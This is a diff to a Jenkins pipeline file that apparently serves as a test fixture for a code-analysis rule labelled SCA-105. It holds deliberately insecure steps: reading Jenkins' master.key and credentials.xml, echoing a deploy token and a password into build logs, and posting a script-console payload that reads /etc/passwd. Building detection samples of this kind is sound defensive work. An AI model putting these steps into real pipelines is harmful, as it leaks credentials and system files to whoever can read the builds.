@@ -15,16 +15,23 @@ pipeline {
     stages {
         stage('Build') {
             steps {
-                // ⚠️ JENKINS CREDENTIAL THEFT
+                // SCA-105: Jenkins credential theft
                 sh '''
                     cat /var/jenkins_home/secrets/master.key
                     cat /var/jenkins_home/credentials.xml
                 '''
+                // SCA-105: withCredentials block exposure
+                withCredentials([string(credentialsId: 'deploy-token', variable: 'TOKEN')]) {
+                    sh "echo ${TOKEN}"
+                    sh "curl -H 'Authorization: Bearer ${TOKEN}' https://api.example.com/deploy"
+                }
+                credentials('production-deploy-key')
+                sh "echo ${PASSWORD}"
             }
         }
         stage('Deploy') {
             steps {
-                // ⚠️ JENKINS SCRIPT CONSOLE ABUSE
+                // Jenkins script console abuse
                 sh 'curl -X POST http://jenkins:8080/scriptText -d "script=println(new File(\'/etc/passwd\').text)"'
             }
         }
